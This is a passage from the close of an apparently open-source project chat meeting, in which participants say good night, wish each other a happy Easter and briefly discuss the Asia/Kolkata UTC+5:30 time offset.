<span style="font-size: 90%;">Oops. Must have misread that graphic. :slightly_smiling_face:</span>

**dune73** <span style="color: grey; font-size: 90%;">19:46:35 UTC</span>

<span style="font-size: 90%;">Anyways, thank you all for attending. Happy easter and see you in 2 weeks at the latest!</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:48:10 UTC</span>

<span style="font-size: 90%;">Good night!</span>

**jit(Xhoenix)** <span style="color: grey; font-size: 90%;">19:48:39 UTC</span>

<span style="font-size: 90%;">Good night everyone.</span>

**franbuehler** <span style="color: grey; font-size: 90%;">19:49:05 UTC</span>

<span style="font-size: 90%;">Good night</span>

**Paul Beckett** <span style="color: grey; font-size: 90%;">19:49:06 UTC</span>

<span style="font-size: 90%;">Good night</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:49:19 UTC</span>

<span style="font-size: 90%;">Actually, _@dune73_ you're right. Asia/Kolkata is +5:30</span>

**Matteo Pace** <span style="color: grey; font-size: 90%;">19:49:33 UTC</span>

<span style="font-size: 90%;">Happy Easter, good night!</span>

**dune73** <span style="color: grey; font-size: 90%;">19:49:47 UTC</span>

<span style="font-size: 90%;">That's what wikipedia just told me too. :slightly_smiling_face:</span>

**dune73** <span style="color: grey; font-size: 90%;">19:50:14 UTC</span>

<span style="font-size: 90%;">But I said "timezones" and technically it's all a single time zone. So I stand corrected.</span>

**jit(Xhoenix)** <span style="color: grey; font-size: 90%;">19:50:15 UTC</span>

<span style="font-size: 90%;">I got it wrong. I thought of something else.</span>

**azurIt** <span style="color: grey; font-size: 90%;">19:50:18 UTC</span>

<span style="font-size: 90%;">Bye friends!</span>

**dune73** <span style="color: grey; font-size: 90%;">19:50:26 UTC</span>

<span style="font-size: 90%;">Bye _@azurIt_</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:50:28 UTC</span>

<span style="font-size: 90%;">_@jit(Xhoenix)_ no worries :smile:</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:50:33 UTC</span>

<span style="font-size: 90%;">bb</span>

**dune73** <span style="color: grey; font-size: 90%;">19:50:45 UTC</span>

<span style="font-size: 90%;">No problem mate.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:51:45 UTC</span>

<span style="font-size: 90%;">I just can't wrap my head around the fact, that it's xx:20 for you right now and not xx:50. My brain thinks time is soo complicated and this is another layer of complexity to me.</span>

